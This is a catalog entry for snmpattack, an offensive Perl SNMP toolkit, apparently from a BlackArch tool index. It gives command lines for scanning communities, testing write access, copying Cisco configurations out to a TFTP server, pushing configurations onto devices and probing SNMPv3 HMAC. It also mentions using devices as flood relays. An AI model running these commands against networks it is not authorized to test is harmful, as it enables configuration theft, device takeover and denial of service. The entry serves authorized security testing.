---
name: "snmpattack"
categories:
  - blackarch-networking
version: "1.8"
homepage: "http://www.c0decafe.de/"
packaged-by: [blackarch]
blackarch-builddate: "2025-07-18"
build-system: perl
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "Seabreg/snmpattack"
github-stars: 0
github-pushed: "2019-09-09"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 1.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# snmpattack

> Perl toolkit for SNMP scanning, community testing and device-specific SNMP attacks.

## What it's for

snmpattack (a Perl tool by Daniel Mende, hosted at c0decafe.de) scans IP ranges for SNMP-speaking devices, tests communities for read-only versus read-write access, and runs attacks against what it finds: Cisco config download/upload over TFTP, APC PDU power actions, InnoMedia device attacks, Cisco WLSE user creation, and a probe for broken HMAC authentication in SNMPv3 implementations. It can also use discovered devices as flood relays against a third party. It is an offensive tool — point it only at equipment you are authorized to test.

## Typical use cases

### Discover SNMP devices and their communities

```
snmpattack -c public,private -t 20 198.51.100.0/24
```

Outcome: parallel-scans the range with the SNMP scan type and reports which hosts respond for each community string; add `-v` to print what the run will do.

### Test whether a community grants write access

```
snmpattack -r -c private 198.51.100.10
```

Outcome: checks the target for read-only versus read-write access with the given community — a read-write hit means writable OIDs (typically configuration changes) are reachable.

### Pull a Cisco config via TFTP

```
snmpattack -c private -C 198.51.100.20 198.51.100.10
```

Outcome: uses the write community to make the Cisco device copy its configuration to the TFTP server you specify (run a TFTP listener there); `-D` pushes a configuration the other way, from the TFTP server onto the device.

### Check SNMPv3 for the broken-HMAC bug

```
snmpattack -H user1 198.51.100.10
```

Outcome: probes the target's SNMPv3 HMAC authentication handling with the given username(s) and reports whether the broken-authentication check is present; `-M OID` selects the probe OID.

*No corpus evidence — derived from upstream documentation.*
